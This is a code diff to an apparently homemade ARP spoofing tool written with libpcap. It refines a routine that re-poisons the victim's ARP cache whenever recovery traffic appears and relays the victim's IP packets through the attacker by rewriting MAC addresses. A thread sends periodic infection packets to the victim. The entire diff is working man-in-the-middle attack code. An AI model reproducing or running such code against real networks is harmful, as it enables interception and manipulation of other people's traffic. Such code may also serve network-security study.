@@ -167,19 +167,15 @@ void get_target_mac(uint8_t *output_target_mac,char *target_ip,pcap_t *fp){
         }
     }
 }
-void anti_recovery_and_relay_packet(char *snd_ip,uint8_t *snd_mac,char *trg_ip, uint8_t *trg_mac,char *atk_ip,uint8_t *rcv_mac,pcap_t *fp)
+void anti_recovery_and_relay_packet(char *snd_ip,uint8_t *snd_mac,char *trg_ip, uint8_t *trg_mac,uint8_t *rcv_mac,pcap_t *fp)
 {
     struct pcap_pkthdr *pkt_header;
     const u_char *pkt_data;
     int res;
 
     struct _ether_hdr *eh;
-    struct iphdr *iph;
 
     uint16_t etype;
-    uint32_t u32_atk_ip;
-
-    inet_pton(AF_INET,atk_ip,&u32_atk_ip);
 
     while(!quit)
     {
@@ -188,28 +184,26 @@ void anti_recovery_and_relay_packet(char *snd_ip,uint8_t *snd_mac,char *trg_ip, 
             if(res== 0)continue;
             eh = (struct _ether_hdr*)pkt_data;
             etype = ntohs(eh->ether_type);
-            iph = (struct iphdr*)(pkt_data+sizeof(struct _ether_hdr));
             if(etype == ETHERTYPE_ARP)
             {//infection  check
+                if(memcmp(trg_mac,eh->Src_mac,6)==0||memcmp(trg_mac,eh->Dst_mac,6)==0)
+                {
                 cout<<"Detected ARP Packet!"<<endl;
                 arp_infection(snd_ip,snd_mac,trg_ip,trg_mac,1,fp);
+                }
             }
             if(etype == ETHERTYPE_IP)
             {
-                //if(memcmp(snd_mac,eh->Dst_mac,6)==0)
-                if(memcmp(trg_mac,eh->Src_mac,6)==0)
+                if(memcmp(trg_mac,eh->Src_mac,6)==0 && memcmp(snd_mac,eh->Dst_mac,6)==0)
                 {
-                    //if(u32_atk_ip != iph->saddr)
-                    //{
-                        memcpy(eh->Dst_mac,rcv_mac,6);
-                        memcpy(eh->Src_mac,snd_mac,6);
-                        if(pcap_sendpacket(fp,pkt_data,(sizeof(struct _ether_hdr)+htons(iph->tot_len)))!=0)
-                        {//use pkt_header length
-                            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
-                        }
-                        break;
+                    memcpy(eh->Dst_mac,rcv_mac,6);
+                    memcpy(eh->Src_mac,snd_mac,6);
+                    if(pcap_sendpacket(fp,pkt_data,pkt_header->len)!=0)
+                    {
+                        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
                     }
-                //}
+                    break;
+                 }
             }
         }
     }
@@ -250,6 +244,6 @@ int main(int argc,char *argv[])
 
     signal(SIGINT,signal_handler);
     thread t1(arp_infection,rcv_ip,atk_mac,snd_ip,snd_mac,0,fp);  //send arp_infection to victim periodically
-    anti_recovery_and_relay_packet(rcv_ip,atk_mac,snd_ip,snd_mac,atk_ip,rcv_mac,fp);
+    anti_recovery_and_relay_packet(rcv_ip,atk_mac,snd_ip,snd_mac,rcv_mac,fp);
     t1.join();
 }
